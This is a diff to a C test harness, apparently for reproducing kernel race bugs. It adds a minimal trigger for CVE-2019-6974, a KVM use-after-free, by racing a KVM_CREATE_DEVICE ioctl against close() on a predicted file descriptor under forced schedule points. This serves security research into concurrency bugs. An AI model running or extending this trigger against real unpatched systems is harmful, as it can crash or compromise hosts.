@@ -61,6 +61,9 @@ static void *th1(void *dummy)
 #ifdef CVE20196974
 #include "schedpoint/cve-2019-6974-1.h"
 #endif
+#ifdef CVE20196974_MINIMAL
+#include "schedpoint/cve-2019-6974-minimal-1.h"
+#endif
 #ifdef SIMPLE_TEST
 #include "schedpoint/simple-1.h"
 #endif
@@ -69,8 +72,11 @@ static void *th1(void *dummy)
 #endif
     };
     install_schedpoint(sched, sizeof(sched) / sizeof(sched[0]));
-#ifdef CVE20196974
-    close(predicted_fd);
+#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
+    struct kvm_create_device cd = {.type = KVM_DEV_TYPE_VFIO,
+                                   .fd = -1, // outparm
+                                   .flags = 0};
+    ioctl(vm, KVM_CREATE_DEVICE, &cd);
 #endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
 #define SYS_qcshed_simple_write 509
@@ -87,6 +93,9 @@ static void *th2(void *dummy)
 #ifdef CVE20196974
 #include "schedpoint/cve-2019-6974-2.h"
 #endif
+#ifdef CVE20196974_MINIMAL
+#include "schedpoint/cve-2019-6974-minimal-2.h"
+#endif
 #ifdef SIMPLE_TEST
 #include "schedpoint/simple-2.h"
 #endif
@@ -96,12 +105,8 @@ static void *th2(void *dummy)
     };
 
     install_schedpoint(sched, sizeof(sched) / sizeof(sched[0]));
-
-#ifdef CVE20196974
-    struct kvm_create_device cd = {.type = KVM_DEV_TYPE_VFIO,
-                                   .fd = -1, // outparm
-                                   .flags = 0};
-    ioctl(vm, KVM_CREATE_DEVICE, &cd);
+#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
+    close(predicted_fd);
 #endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
 #define SYS_qcshed_simple_read 510
@@ -113,7 +118,7 @@ static void *th2(void *dummy)
 
 static void init()
 {
-#ifdef CVE20196974
+#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
     predicted_fd = -1;
     int kvm = open("/dev/kvm", O_RDWR);
     if (kvm == -1)
@@ -133,7 +138,10 @@ int main(void)
 
     set_affinity(0);
 #ifdef CVE20196974
-    nr_bps = 60;
+    nr_bps = 22;
+#endif
+#ifdef CVE20196974_MINIMAL
+    nr_bps = 2;
 #endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
     nr_bps = 20;
